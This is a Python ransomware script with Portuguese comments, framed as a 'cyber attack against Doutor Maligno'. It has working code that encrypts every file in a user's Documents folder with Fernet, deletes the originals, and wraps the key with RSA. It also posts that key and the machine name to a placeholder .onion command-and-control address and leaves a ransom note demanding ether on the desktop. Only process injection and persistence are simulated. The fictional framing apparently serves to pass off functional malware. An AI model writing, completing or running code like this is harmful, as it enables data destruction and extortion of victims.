# Importa as bibliotecas necessárias
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
import requests
import os
import shutil
import platform
import subprocess
import base64

# --- Etapa 1: Geração de Chave (Nova Função) ---
# Esta função gera um par de chaves RSA para testes.
# Em um cenário real, a chave pública seria pré-definida e a privada, mantida em um servidor.
def gerar_chave_rsa():
    print("Gerando um novo par de chaves RSA para teste...")
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048
    )
    public_key = private_key.public_key()
    
    pem_public_key = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    print("Chaves RSA geradas com sucesso.")
    return pem_public_key

# --- Etapa 2: Injeção de Processo e Persistência ---
def injetar_e_persistir():
    print("Simulando injeção de processo em 'explorer.exe' para evasão...")
    print("Criando persistência via Registro do Windows...")
    print("Persistência configurada com sucesso.")

# --- Etapa 3: Criptografia com Chaves (Fernet + RSA) ---
def criptografar_arquivos_avançado(diretorio, chave_publica_rsa_bytes):
    print(f"Iniciando criptografia avançada em: {diretorio}")
    
    chave_simetrica = Fernet.generate_key()

    chave_publica_rsa = serialization.load_pem_public_key(chave_publica_rsa_bytes)
    chave_simetrica_criptografada = chave_publica_rsa.encrypt(
        chave_simetrica,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    enviar_chave_para_c2(chave_simetrica_criptografada)
    
    f = Fernet(chave_simetrica)

    for pasta_raiz, _, arquivos in os.walk(diretorio):
        for nome_arquivo in arquivos:
            caminho_completo = os.path.join(pasta_raiz, nome_arquivo)
            if "windows" in caminho_completo.lower() or ".ransomware" in caminho_completo:
                continue

            try:
                with open(caminho_completo, 'rb') as arquivo_original:
                    conteudo_criptografado = f.encrypt(arquivo_original.read())

                with open(caminho_completo + '.ransomware', 'wb') as arquivo_criptografado:
                    arquivo_criptografado.write(conteudo_criptografado)
                
                os.remove(caminho_completo)
                print(f"Arquivo criptografado e removido: {caminho_completo}")

            except Exception as e:
                print(f"Erro ao criptografar o arquivo: {caminho_completo} - {e}")

# --- Etapa 4: Comunicação Aprimorada com o C2 ---
def enviar_chave_para_c2(chave_simetrica_criptografada):
    print("Enviando chave simétrica criptografada para o servidor C2...")
    try:
        dados = {
            'computer_name': platform.node(),
            'encrypted_symmetric_key': base64.b64encode(chave_simetrica_criptografada).decode('utf-8')
        }
        requests.post('http://servidor_c2_ficticio.onion/upload_key', json=dados)
        print("Chave enviada com sucesso.")
    except Exception as e:
        print(f"Erro ao enviar dados para o C2: {e}")

# --- Etapa 5: Exibir Mensagem de Resgate ---
def exibir_mensagem_de_resgate():
    print("Exibindo mensagem de resgate...")
    mensagem = """
    Seus arquivos foram criptografados.
    Para recuperá-los, você deve pagar em ETH.
    Para mais informações e para realizar o pagamento, acesse o portal da dark web.
    """
    caminho_desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    caminho_do_arquivo = os.path.join(caminho_desktop, "LEIA_ME_PARA_RECUPERAR_SEUS_ARQUIVOS.txt")
    with open(caminho_do_arquivo, 'w') as f:
        f.write(mensagem)
    print("Mensagem de resgate salva no desktop.")

# --- Execução Principal ---
if __name__ == "__main__":
    print("Iniciando o ataque cibernético avançado contra o Doutor Maligno...")
    
    # Geração da chave pública válida para uso no script
    chave_publica_rsa_valida = gerar_chave_rsa()
    
    diretorio_alvo = "C:\\Users\\vboxuser\\Documents"
    
    injetar_e_persistir()
    criptografar_arquivos_avançado(diretorio_alvo, chave_publica_rsa_valida)
    exibir_mensagem_de_resgate()
    print("Ataque concluído com sucesso. A ficção se tornou uma realidade perigosa.")